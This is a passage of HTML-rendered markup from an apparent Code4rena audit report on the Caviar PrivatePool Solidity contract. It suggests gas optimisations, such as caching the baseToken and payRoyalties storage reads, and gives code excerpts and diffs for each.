class=\"mtk12\">baseToken</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) { </span><span class=\"mtk3\">// @audit: 1st sload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">358</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// transfer ETH to the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">359</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">netOutputAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">360</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">361</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// if the protocol fee is set then pay the protocol fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">362</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">363</span><span class=\"mtk1\">:        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">364</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// transfer base tokens to the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">365</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">netOutputAmount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @audit: 2nd sload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">366</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">367</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// if the protocol fee is set then pay the protocol fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">368</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">), </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @audit: 3rd sload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">369</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"95\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..2511385 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -353,8 +353,9 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // subtract the royalty fee amount from the net output amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         netOutputAmount -= royaltyFeeAmount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (baseToken == address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address _baseToken = baseToken;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (_baseToken == address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // transfer ETH to the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             msg.sender.safeTransferETH(netOutputAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -362,10 +363,10 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             if (protocolFeeAmount &gt; 0) factory.safeTransferETH(protocolFeeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // transfer base tokens to the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            ERC20(baseToken).transfer(msg.sender, netOutputAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            ERC20(_baseToken).transfer(msg.sender, netOutputAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // if the protocol fee is set then pay the protocol fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            if (protocolFeeAmount &gt; 0) ERC20(baseToken).safeTransfer(address(factory), protocolFeeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (protocolFeeAmount &gt; 0) ERC20(_baseToken).safeTransfer(address(factory), protocolFeeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L225-L259\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L225-L259</a></p>\n<h3 id=\"cache-basetoken-to-save-3-sloads-2\" style=\"position:relative;\"><a href=\"#cache-basetoken-to-save-3-sloads-2\" aria-label=\"cache basetoken to save 3 sloads 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache <code>baseToken</code> to save 3 SLOADs.</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"96\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">225</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidEthAmount</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// @audit: 1st sload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">254</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) { </span><span class=\"mtk3\">// @audit: 2nd sload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">255</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// transfer the base token from the caller to the contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">256</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @audit: 3rd sload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">257</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">258</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// if the protocol fee is set then pay the protocol fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">259</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">), </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @audit: 4th sload</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"97\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..5cc3318 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -216,19 +216,22 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ~~~ Checks ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // calculate the sum of weights of the NFTs to buy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address _baseToken = baseToken;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // calculate the required net input amount and fee amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        (netInputAmount, feeAmount, protocolFeeAmount) = buyQuote(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // calculate the required net input amount and fee amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            (netInputAmount, feeAmount, protocolFeeAmount) = buyQuote(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // check that the caller sent 0 ETH if the base token is not ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (baseToken != address(0) &amp;&amp; msg.value &gt; 0) revert InvalidEthAmount();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // check that the caller sent 0 ETH if the base token is not ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (_baseToken != address(0) &amp;&amp; msg.value &gt; 0) revert InvalidEthAmount();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // ~~~ Effects ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // ~~~ Effects ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // update the virtual reserves</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        virtualBaseTokenReserves += uint128(netInputAmount - feeAmount - protocolFeeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        virtualNftReserves -= uint128(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // update the virtual reserves</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            virtualBaseTokenReserves += uint128(netInputAmount - feeAmount - protocolFeeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            virtualNftReserves -= uint128(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ~~~ Interactions ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -251,12 +254,12 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // add the royalty fee amount to the net input aount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         netInputAmount += royaltyFeeAmount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (baseToken != address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (_baseToken != address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // transfer the base token from the caller to the contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            ERC20(baseToken).safeTransferFrom(msg.sender, address(this), netInputAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            ERC20(_baseToken).safeTransferFrom(msg.sender, address(this), netInputAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // if the protocol fee is set then pay the protocol fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            if (protocolFeeAmount &gt; 0) ERC20(baseToken).safeTransfer(address(factory), protocolFeeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (protocolFeeAmount &gt; 0) ERC20(_baseToken).safeTransfer(address(factory), protocolFeeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // check that the caller sent enough ETH to cover the net required input</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             if (msg.value &lt; netInputAmount) revert InvalidEthAmount();</span></span></span></code></pre>\n<h2 id=\"g-04-cache-state-variables-outside-of-loop-to-avoid-reading-storage-on-every-iteration\" style=\"position:relative;\"><a href=\"#g-04-cache-state-variables-outside-of-loop-to-avoid-reading-storage-on-every-iteration\" aria-label=\"g 04 cache state variables outside of loop to avoid reading storage on every iteration permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-04] Cache state variables outside of loop to avoid reading storage on every iteration</h2>\n<p>Reading from storage should always try to be avoided within loops. In the following instances, we are able to cache state variables outside of the loop to save a <code>Gwarmaccess (100 gas)</code> per loop iteration.</p>\n<p><strong>Note: Due to <code>stack too deep</code> errors, we will not be able to cache all the state variables read within the loops.</strong> </p>\n<p>Total Instances: <code>6</code></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L238-L271\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L238-L271</a></p>\n<h3 id=\"cache-payroyalties-to-avoid-storage-reads-on-each-loop-iteration\" style=\"position:relative;\"><a href=\"#cache-payroyalties-to-avoid-storage-reads-on-each-loop-iteration\" aria-label=\"cache payroyalties to avoid storage reads on each loop iteration permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache <code>payRoyalties</code> to avoid storage reads on each loop iteration</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"98\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">238</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">239</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// transfer the NFT to the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">240</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">241</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">242</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">payRoyalties</span><span class=\"mtk1\">) { </span><span class=\"mtk3\">// @audit 1st sload + on every iteration</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">271</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">payRoyalties</span><span class=\"mtk1\">) { </span><span class=\"mtk3\">// @audit: 2nd sload</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"99\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..5d46070 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -216,30 +216,33 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ~~~ Checks ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // calculate the sum of weights of the NFTs to buy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // calculate the required net input amount and fee amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        (netInputAmount, feeAmount, protocolFeeAmount) = buyQuote(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // calculate the required net input amount and fee amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            (netInputAmount, feeAmount, protocolFeeAmount) = buyQuote(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // check that the caller sent 0 ETH if the base token is not ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (baseToken != address(0) &amp;&amp; msg.value &gt; 0) revert InvalidEthAmount();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // check that the caller sent 0 ETH if the base token is not ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (baseToken != address(0) &amp;&amp; msg.value &gt; 0) revert InvalidEthAmount();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // ~~~ Effects ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // ~~~ Effects ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // update the virtual reserves</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        virtualBaseTokenReserves += uint128(netInputAmount - feeAmount - protocolFeeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        virtualNftReserves -= uint128(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // update the virtual reserves</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            virtualBaseTokenReserves += uint128(netInputAmount - feeAmount - protocolFeeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            virtualNftReserves -= uint128(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ~~~ Interactions ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span 